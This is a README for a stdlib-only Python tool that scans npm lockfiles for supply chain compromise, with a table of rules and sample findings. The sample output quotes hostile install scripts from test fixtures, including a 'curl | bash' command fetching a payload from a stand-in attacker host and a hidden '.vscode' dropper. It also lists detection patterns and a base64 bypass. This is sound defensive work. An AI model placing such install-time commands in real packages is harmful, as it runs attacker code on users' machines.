# lockfile-analyzer

A learning project for supply chain security. Statically analyzes npm lockfiles (`package-lock.json`, `yarn.lock`) for signs of compromise. No network calls, no external dependencies.

Inspired by two real-world incidents that happened on the same day (March 31, 2026): a malicious version of `axios` was pushed to npm containing a Remote Access Trojan, and Anthropic accidentally shipped Claude Code's internal source code inside a public npm package ([read more](https://venturebeat.com/technology/claude-codes-source-code-appears-to-have-leaked-heres-what-we-know)). Both cases showed that lockfiles are not just boring metadata: they record exactly what got installed, from where, and with what credentials. If something slipped in, the lockfile knows. This tool is my attempt to understand how to detect that programmatically.

A month later, on April 30, 2026, attackers stole npm credentials and used them to inject a malicious `preinstall` script (`node .vscode/setup.mjs`) into the PyTorch Lightning packages. Anyone who installed those packages downstream ran the dropper. That attack motivated the `lifecycle` rule.

## What it detects

| Rule | Severity | What it looks for |
|------|----------|-------------------|
| `blocklist` | HIGH | Known malicious package names |
| `secrets` | HIGH | GitHub tokens, AWS keys, URLs with embedded credentials |
| `typosquat` | HIGH / MEDIUM | Names suspiciously close to popular packages (e.g. `lodahs` vs `lodash`) |
| `transitive` | MEDIUM | Unexpected dependencies with suspicious naming patterns |
| `version` | MEDIUM / LOW | Odd pre-release suffix, git hash version, non-registry source |
| `integrity` | MEDIUM / LOW | Missing or malformed integrity hash |
| `lifecycle` | HIGH / MEDIUM | Suspicious commands in install scripts (curl/wget, pipe-to-shell, scripts hidden in `.vscode/` or `.claude/`) |

## How it works

The tool parses a lockfile into a uniform `Package(name, version, source, integrity, scripts)` model. The shape is the same whether the input is `package-lock.json` or `yarn.lock`. Each rule in `lockfile_analyzer/rules/` receives the full package list and returns zero or more `Finding`s tagged with a severity. Rules are independent: order does not matter, and adding one does not affect the others. The CLI aggregates findings, prints them grouped by severity, and exits with `0/1/2` based on the highest severity seen.

Rules with external state (`blocklist`, `typosquat`) read their reference data from `data/` at startup: `blocklist.txt` for known-bad names, `top_packages.txt` for the typosquat baseline. These are static snapshots, updated by editing the files. No network calls at any point.

## Usage

```bash
python3 -m venv .venv && source .venv/bin/activate

# run without installing
PYTHONPATH=. python -m lockfile_analyzer.main path/to/package-lock.json

# quick test
PYTHONPATH=. python -m lockfile_analyzer.main tests/fixtures/package-lock.json

# see the lifecycle rule in action
PYTHONPATH=. python -m lockfile_analyzer.main tests/fixtures/lifecycle-malicious.json
```

Exit codes: `0` clean, `1` medium/low findings, `2` high findings.

## Sample output

Running against the lifecycle fixture:

```
[HIGH]   pytorch-lightning-clone@2.4.1 [lifecycle]
         'pytorch-lightning-clone@2.4.1' has a 'preinstall' script that references an IDE or tooling config directory (.vscode/, .claude/, .cursor/, .idea/, .github/) — typical hiding place for install-time droppers: 'node .vscode/setup.mjs'
         → Open the referenced file and inspect its contents. Published packages should not execute code from IDE config dirs.

[HIGH]   curl-pipe-attack@1.0.0 [lifecycle]
         'curl-pipe-attack@1.0.0' has a 'postinstall' script that pipes content directly into a shell — classic 'curl | sh' remote-exec pattern: 'curl -fsSL https://evil.example.com/payload.sh | bash'
         → Reject any package that downloads and executes code at install time. Consider 'npm install --ignore-scripts' as a temporary mitigation.

[MEDIUM] sh-dash-c-pkg@1.2.3 [lifecycle]
         'sh-dash-c-pkg@1.2.3' has a 'preinstall' script that invokes a shell with -c (inline command execution): 'bash -c 'echo doing something obscure''
         → Audit the inlined command. Shell -c in install scripts is a common obfuscation vector.

[...4 more findings omitted...]

Scanned 6 packages. Found 7 issue(s): 5 HIGH, 2 MEDIUM, 0 LOW.
```

Output is coloured when stdout is a TTY, plain text otherwise.

## Limitations

- **Static only.** Reads the lockfile, does not fetch tarballs, does not execute install scripts, does not verify what is actually published on the registry.
- **npm and yarn only.** No pnpm (different lockfile format), no bun, no Python (`poetry.lock`, `uv.lock`), no Rust (`Cargo.lock`).
- **Blocklist and top-packages list are static snapshots** in `data/`, updated by hand. No live lookup against OSV, GHSA, or any advisory database.
- **Typosquat detection is edit-distance based.** Names legitimately close to popular ones (e.g. `lodash-es` vs `lodash`) can trigger false positives.
- **Lifecycle rule is regex-based** on install script bodies. An attacker who base64-encodes the command and decodes it at runtime will bypass the patterns.
- **No signature verification** (Sigstore, PGP, npm provenance attestations, TUF metadata).

## Extending

Add entries to `data/blocklist.txt` or `data/top_packages.txt`. New rules go in `lockfile_analyzer/rules/`, with the same contract as the existing ones: takes packages, returns findings.

## Requirements

Python 3.11+, stdlib only.

## References

SLSA (Supply-chain Levels for Software Artifacts). slsa.dev

OSV (Open Source Vulnerabilities database). osv.dev

OpenSSF Scorecard. Automated security checks for open source projects. github.com/ossf/scorecard

Ohm, Plate, Sykosch, Meier. Backstabber's Knife Collection: A Review of Open Source Software Supply Chain Attacks. DIMVA 2020. arxiv.org/abs/2005.09535

## Connect with me

[LinkedIn](https://www.linkedin.com/in/francescopl/) · [Kaggle](https://www.kaggle.com/francescopaolol)

